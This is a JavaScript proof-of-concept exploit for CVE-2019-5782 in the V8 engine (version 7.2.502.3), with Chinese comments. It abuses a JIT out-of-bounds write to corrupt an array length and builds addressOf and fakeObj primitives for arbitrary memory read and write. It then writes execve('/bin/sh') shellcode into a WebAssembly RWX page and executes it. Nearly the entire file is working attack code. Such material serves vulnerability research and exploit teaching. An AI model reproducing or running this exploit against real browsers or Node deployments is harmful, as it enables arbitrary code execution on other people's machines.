// 7.2.502.3
// CVE-2019-5782



const fake_obj_offset_of_fake_array = 0x30n;
const backing_store_offset_of_wasm_instance = 0xe8n;
const backing_store_offset_of_data_buf = 0x20n;


//1、init rwx memory
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule,{});
var f = wasmInstance.exports.main;
//2、lib function
var f64 = new Float64Array(1);
var bigUint64 = new BigUint64Array(f64.buffer);
var u32 = new Uint32Array(f64.buffer);


function ftoi(f){
    f64[0] = f;
    return bigUint64[0];
}

function itof(i){
    bigUint64[0] = i;
    return f64[0];
}

function getLow(double){
	f64[0] = double;
	return u32[0];
}

function getHigh(double){
	f64[0] = double;
	return u32[1];
}

function u32Tof64(low,high){
	u32[0] = low;
	u32[1] = high;
	return f64[0];
}

function u2d(lo, hi) {
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}
  
function d2u(v) {
    f64[0] = v;
    return u32;
}

function hex(i){
    return i.toString(16).padStart(8,"0");
}



function read64(addr){
    console.log("[*] addr:0x"+hex(addr));
    fake_array[2] = itof(addr - 0x10n + 0x1n);
    // %SystemBreak();
    
    return ftoi(fake_object[0]);
}

function write64(addr,data){
    fake_array[2] = itof(addr - 0x10n + 0x1n);
    fake_object[0] = itof(data);
}


function fakeObj(addr_to_fake){
    double_array[0] = itof(addr_to_fake + 1n);
    tool_array[23] = obj_map;  // 把浮点型数组的map地址改为对象数组的map地址
    let faked_obj = double_array[0];
    tool_array[23] = array_map;
    return faked_obj;
}

function addressOf(obj_to_leak){
    obj_array[0] = obj_to_leak;
    tool_array[34] = array_map; // 把obj数组的map地址改为浮点型数组的map地址
    let obj_addr = ftoi(obj_array[0]) - 1n;
    tool_array[34] = obj_map; // 把obj数组的map地址改回来，以便后续使用
    return obj_addr;
}

function copyShellcodeToRwx(shellcode,rwx_addr){

    var data_buf = new ArrayBuffer(shellcode.length * 8);
    var data_view = new DataView(data_buf);
	var data_buf_address = addressOf(data_buf);
    var buf_backing_store_addr = data_buf_address + backing_store_offset_of_data_buf;
    // %DebugPrint(data_buf);
    // %SystemBreak();
	console.log("[*] rwx_addr: 0x"+hex(rwx_addr));
    console.log("[*] buf_backing_store_addr: 0x" + hex(buf_backing_store_addr));
    
    write64(buf_backing_store_addr,rwx_addr);
    // %DebugPrint(data_buf);
    // %SystemBreak();
    for(let i = 0;i < shellcode.length;i++){
        data_view.setFloat64(i * 8,itof(shellcode[i]),true);
    }
    
}




//3、poc
var double_array = [1.1];
var obj = {"a":1};
var obj_array = [obj];

function fun(arg) {
    let x = arguments.length;
    a1 = new Array(0x10);//原本长度16
    a1[0] = 1.1;
    tool_array = new Array(0x10);

    double_array = [1.1];
    obj = {"a":1};
    obj_array = [obj];

    tool_array[0] = 1.1;
    // console.log(itof(0xfff00000000n));
    a1[(x >> 16) * 21] = 8.689572764003e-311;  // 0xffff00000000，fun优化后a1的index变为21，超过了原本的index16，出现越界写，将tool_array的数组的长度修改为65535
    a1[(x >> 16) * 41] = 8.689572764003e-311; // 0xffff00000000
  }
 
var a1, tool_array;
var a3 = new Array();
a3.length = 0x11000;
// %OptimizeFunctionOnNextCall(fun);//根据未优化调用传递的参数，优化fun代码

for(var i = 0;i < 60000;i++){
    fun(1)
}

fun(...a3); // "..." convert array to arguments list，调用优化后的fun代码
console.log(tool_array.length); //65535


//① 越界读，获取array_map,obj_map
var array_map = tool_array[23];
var obj_map = tool_array[34];


console.log("[*] array_map = 0x" + hex(ftoi(array_map)));
console.log("[*] obj_map = 0x" + hex(ftoi(obj_map)));


var fake_array = [
    array_map,
    itof(0n),
    itof(0x41414141n),
    itof(0x100000000n)
];
//② 越界写，构造类型混淆，obj array->double array，获取fake_array地址，double array->obj array，伪造fake_obj
// fake_array[1]和fake_obj[0]对应同一块内存，通过fake_array读写时，v8认为这块内存保存的是一个8字节（64位）的double，通过fake_obj读写时v8认为保存的是对象指针
// 因此可以通过fake_array写入任意地址，通过fake_obj实现任意地址读写。

fake_array_addr = addressOf(fake_array);

console.log("[*] leak fake_array addr :0x"+hex(fake_array_addr));

fake_object_addr = fake_array_addr + fake_obj_offset_of_fake_array;

var fake_object = fakeObj(fake_object_addr);

// %DebugPrint(fake_array);
// %DebugPrint(fake_object);



var wasm_instance_addr = addressOf(wasmInstance);

console.log("[*] leak wasm_instance addr:0x" + hex(wasm_instance_addr));

var rwx_page_addr = read64(wasm_instance_addr + backing_store_offset_of_wasm_instance);

console.log("[*] leak rwx_page_addr : 0x"+hex(rwx_page_addr));

var shellcode = [
    0x2fbb485299583b6an,
    0x5368732f6e69622fn,
    0x050f5e5457525f54n
]
// ④wasm_instance的backing_store是rwx的，将data_buf的backing_store替换成wasm_instance的backing_store
copyShellcodeToRwx(shellcode,rwx_page_addr);

f();



